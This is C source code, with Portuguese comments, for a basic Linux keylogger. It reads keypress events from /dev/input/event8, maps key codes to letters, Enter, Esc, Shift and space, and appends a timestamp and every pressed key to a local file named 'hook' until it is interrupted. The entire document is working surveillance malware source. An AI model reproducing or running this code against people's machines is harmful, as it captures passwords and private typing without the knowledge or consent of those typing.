#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <linux/input.h>

#define KEY_DEVICE "/dev/input/event8" // Disposítivo do teclado
#define HOOK_FILE "hook" // Arquivo onde será salva as informações

FILE *hook_file;

char *get_time(){
	time_t r_time;
	struct tm *t_info;

	time(&r_time);
	t_info = localtime(&r_time);
	return asctime(t_info);
}

char *keys_table(int key){
	switch(key){
		case 28:	return "<Enter>";
		case 1: 	return "<Esc>";
		case 30:	return "A";
		case 48:	return "B";
		case 46:	return "C";
		case 32:	return "D";
		case 18:	return "E";
		case 33:	return "F";
		case 34:	return "G";
		case 35:	return "H";
		case 23:	return "I";
		case 36:	return "J";
		case 37:	return "K";
		case 38:	return "L";
		case 50:	return "M";
		case 49:	return "N";
		case 24:	return "O";
		case 25:	return "P";
		case 16:	return "Q";
		case 19:	return "R";
		case 31:	return "S";
		case 20:	return "T";
		case 22:	return "U";
		case 47:	return "V";
		case 17:	return "W";
		case 45:	return "X";
		case 21:	return "Y";
		case 44:	return "Z";
		case 42:	return "<Shift>";
		case 57:	return " ";
		default:	return "<undefined>";
	}
}

void signal_close(int signum){
	fprintf(hook_file,"\n");
	fclose(hook_file);

	exit(EXIT_SUCCESS);
}

int main(int argc, char **argv){
	int fd;
	struct input_event ie;
	signal(SIGINT, signal_close);

	hook_file = fopen(HOOK_FILE,"a");

	if( (fd = open(KEY_DEVICE, O_RDONLY)) == -1 ){ // Abre o arquivo para somente leitura
		perror("Não pode acessar o arquivo");
		return EXIT_FAILURE;
	}

	fprintf(hook_file,"%s", get_time());
	while(read(fd, &ie, sizeof(struct input_event))){ // le o arquivo e armazena em ie
		if(ie.type == 1 && ie.value == 1){ // Pega apenas as teclas precionadas
			fprintf(hook_file, "%s", keys_table(ie.code)); // Escreve as teclas no arquivo
		}
	}

	return EXIT_SUCCESS;
}
